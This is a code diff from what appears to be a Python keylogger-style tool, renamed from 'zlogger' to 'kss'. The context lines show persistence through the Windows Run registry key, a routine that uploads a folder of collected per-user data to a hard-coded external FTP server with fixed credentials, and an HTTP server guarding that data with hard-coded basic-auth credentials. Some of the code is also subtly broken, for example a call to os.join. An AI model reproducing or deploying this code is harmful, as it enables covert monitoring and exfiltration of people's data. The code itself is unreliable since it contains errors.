@@ -24,7 +24,7 @@ def current_time():
 #For creating app dir
 def dir_path():
     home_path = os.path.expanduser("~")
-    dir_name = "zlogger"
+    dir_name = "kss"
     app_root = os.path.join(home_path, dir_name)
     dir_path = os.path.join(app_root, user_name())
     if not os.path.exists(dir_path):
@@ -43,7 +43,7 @@ def add_startup():
     # in python __file__ is the instant of file path where it was executed
     pth = os.path.dirname(os.path.realpath(__file__))
     # name of the python file with extension
-    s_name="zlogger.py"    
+    s_name="kss.py"    
     # joins the file name to end of path address
     address=os.join(pth,s_name) 
     # key we want to change is HKEY_CURRENT_USER  key value is Software\Microsoft\Windows\CurrentVersion\Run
@@ -52,7 +52,7 @@ def add_startup():
     # open the key to make changes to
     open = winreg.OpenKey(key,key_value,0,winreg.KEY_ALL_ACCESS)
     # modify the opened key
-    winreg.SetValueEx(open,"zlogger",0,winreg.REG_SZ,address)
+    winreg.SetValueEx(open,"kss",0,winreg.REG_SZ,address)
     # now close the opened key
     winreg.CloseKey(open)
 
@@ -97,8 +97,8 @@ def active_interface():
 def sync():
     home_path = os.path.expanduser("~")
     dir_list = os.listdir(home_path)
-    if "zlogger" in dir_list:
-        source_path = os.path.join(home_path, "zlogger")
+    if "kss" in dir_list:
+        source_path = os.path.join(home_path, "kss")
         target_path = "/var/www/html/"
     SYNC = SyncFtp("20.124.217.64", "zlogger", "zlogger")
     while True:
@@ -128,7 +128,7 @@ class AuthHandler(http.server.SimpleHTTPRequestHandler):
             self.send_error(400, "Bad request")
             return
         username, password = base64.b64decode(auth_parts[1]).decode().split(":")
-        if username != "zlogger" or password != "zlogger":
+        if username != "kss" or password != "kss":
             self.send_error(403, "Forbidden")
             return
         super().do_GET()
